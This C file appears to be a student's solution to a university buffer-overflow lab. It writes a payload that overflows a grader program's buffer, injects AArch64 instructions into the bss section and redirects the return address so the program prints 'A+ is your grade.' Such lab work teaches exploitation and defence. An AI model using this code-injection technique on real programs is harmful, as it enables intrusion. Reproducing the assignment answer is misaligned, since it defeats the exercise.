/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* Author: Jiatong Yu, Jacqueline He                                  */
/*--------------------------------------------------------------------*/
#include <stdio.h>
#include "miniassembler.h"
#include <string.h>


/* main function writes to dataAplus, which overwrites the grader
program to give A+ */
int main(void) {
    unsigned int uiRes;
    unsigned long ulAddr;
    char formatString[] = "A+ is your grade.%c"; /* 20 chars including \0 */
    FILE* psFile;
    int i;
    psFile = fopen("dataAplus", "w");

    /* idea: change the x0 and x1 content before printf */

    /* write name into file (buf[0] to buf[7]) */
    fprintf(psFile, "Yu & He");
    putc('\0', psFile);

    /* store argument into buf[8] to buf[27] */
    fwrite(formatString, sizeof(formatString), 1, psFile);

    /* instruction: store the address of buf[8] into x0 */
    /* this instrc at buf[28] */
    uiRes = MiniAssembler_adr(0, 0x420060, 0x420074);
    fwrite(&uiRes, sizeof(unsigned int), 1, psFile);

    /* instruction: store '\n' into w1 */
    /* this instruc at buf[32] */
    uiRes = MiniAssembler_mov(1, '\n');
    fwrite(&uiRes, sizeof(unsigned int), 1, psFile);

    /* instruction: branch to printf at 0x400874 */
    /* this instrc at buf[36] */
    uiRes = MiniAssembler_b(0x400874, 0x42007c);
    fwrite(&uiRes, sizeof(unsigned int), 1, psFile);

    /* paddings to go to x30 */
    /* this instrc at buf[40] */
    for(i = 0; i < 8; i++) putc('\0', psFile);

    /* return to the bss section buf[28] */
    ulAddr = 0x420074;
    fwrite(&ulAddr, sizeof(unsigned long), 1, psFile);

    fclose(psFile);
    return 1;
    
}